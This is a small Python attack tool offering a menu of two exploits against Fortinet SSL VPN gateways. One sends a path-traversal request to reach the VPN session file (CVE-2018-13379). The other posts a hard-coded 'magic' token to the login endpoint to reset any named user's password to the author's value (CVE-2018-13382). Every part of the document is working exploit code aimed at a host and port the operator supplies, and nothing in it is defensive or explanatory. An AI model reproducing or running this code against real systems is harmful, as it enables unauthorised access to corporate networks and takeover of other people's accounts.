####################
# Criado by Isloka #
####################

print('\nMade by Isloka.\n')

def menu():
    print('Choose your exploit...\n[1] LeakRecentLogins (CVE-2018-13379)\n[2] ChangePassword (CVE-2018-13382)')
    sla = input('\n> ')
    if sla == '1':
        import requests, urllib3, sys, time
        urllib3.disable_warnings()
        host = input('\n[!] Host > ')
        port = input('[!] Port > ')
        uri = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
        url = "https://"+host+":"+port+uri
        headers = {"User-Agent": "Mozilla/5.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        print("\n[!] Checking vulnerability...")
        r = requests.get(url, verify=False)
        if(r.status_code == 200):
            print('[+] Vulnerability found!')
            print('[+] URL: ' + url)
        else:
            print('[X] Exploit did not work.\n')
            menu()
    elif sla == '2':
        import requests, urllib3, sys, re, argparse
        urllib3.disable_warnings()
        host = input('\n[!] Host > ')
        port = input('[!] Port > ')  
        user = input('[!] User > ')
        senha = 'isloka@404'  
        url = "https://"+host+":"+port+"/remote/logincheck"
        exploit = {'ajax':'1','username':user,'magic':'4tinet2095866','credential':senha}
        r = requests.post(url, verify=False, data = exploit)
        if re.search("/remote/hostcheck_install",r.text):
            print("\n[+] Password changed!\n[+] User: "+user+"\n[+] Password: "+senha)
        else:
            print("[X] Exploit did not work.\n")
            menu()
    else:
        print('\n[!] Exploit not found!')
        menu()
menu()
